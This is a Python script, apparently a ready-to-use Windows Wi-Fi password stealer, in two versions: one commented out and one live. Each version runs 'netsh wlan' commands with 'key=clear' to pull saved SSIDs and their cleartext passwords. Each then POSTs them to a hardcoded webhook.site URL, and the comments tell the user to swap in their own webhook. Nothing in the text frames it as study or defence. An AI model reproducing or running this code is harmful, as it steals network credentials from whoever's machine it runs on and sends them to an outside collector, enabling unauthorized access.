# import subprocess
# import os
# import sys
# import requests

# # URL
# url = "https://webhook.site/0f6a26dd-9b82-4734-bfd6-41951554757d"

# wifi_files = []
# wifi_name = []
# wifi_password = []

# # making a file of passwords
# pf = open("passwords.txt", "w")
# pf.write("Passwords:\n\n")
# pf.close()

# # using python to execute windows commands ("netsh wlan export profile key=clear") each comma = space
# command = subprocess.run(
#     ["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True
# ).stdout.decode()

# # grab a current working directory (cwd)
# path = os.getcwd()

# for item in os.listdir(path):
#     if item.startswith("Wi-Fi") and item.endswith(".xml"):
#         wifi_files.append(item)

# for wn in wifi_files:
#     with open(wn, "r") as f:
#         for line in f.readlines():
#             if "name" in line:
#                 stripped = line.strip()
#                 front = stripped[6:]
#                 back = front[:-7]
#                 if back not in wifi_name:
#                     wifi_name.append(back)
#             if "keyMaterial" in line:
#                 stripped = line.strip()
#                 front = stripped[13:]
#                 back = front[:-14]
#                 if back not in wifi_password:
#                     wifi_password.append(back)
# for x, y in zip(wifi_name, wifi_password):
#     sys.stdout = open("passwords.txt", "a")
#     print("SSID: " + x, "Password: " + y, sep="\n")
#     sys.stdout.close()

# sending to URL
# with open("passwords.txt", "rb") as f:
#     r = requests.post(url, data=f)


import subprocess, os, sys, requests, re, urllib

# Replace with your webhook
url = "https://webhook.site/0f6a26dd-9b82-4734-bfd6-41951554757d"

# Lists and regex
found_ssids = []
pwnd = []
wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
wlan_key_regex = r"Key Content\s+:\s(.*)$"

# Use Python to execute Windows command
get_profiles_command = subprocess.run(
    ["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE
).stdout.decode()

# Append found SSIDs to list
matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
for match in matches:
    for group in match.groups():
        found_ssids.append(group.strip())

# Get cleartext password for found SSIDs and place into pwnd list
for ssid in found_ssids:
    get_keys_command = subprocess.run(
        ["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"],
        stdout=subprocess.PIPE,
    ).stdout.decode()
    matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
    for match in matches:
        for group in match.groups():
            pwnd.append({"SSID": ssid, "Password": group.strip()})

# Check if any pwnd Wi-Fi exists, if not exit
if len(pwnd) == 0:
    print("No Wi-Fi profiles found. Exiting...")
    sys.exit()

print("Wi-Fi profiles found. Check your webhook...")

# Send the hackies to your webhookz
final_payload = ""
for pwnd_ssid in pwnd:
    final_payload += "[SSID:%s, Password:%s]\n" % (
        pwnd_ssid["SSID"],
        pwnd_ssid["Password"],
    )  # Payload display format can be changed as desired

r = requests.post(url, params="format=json", data=final_payload)
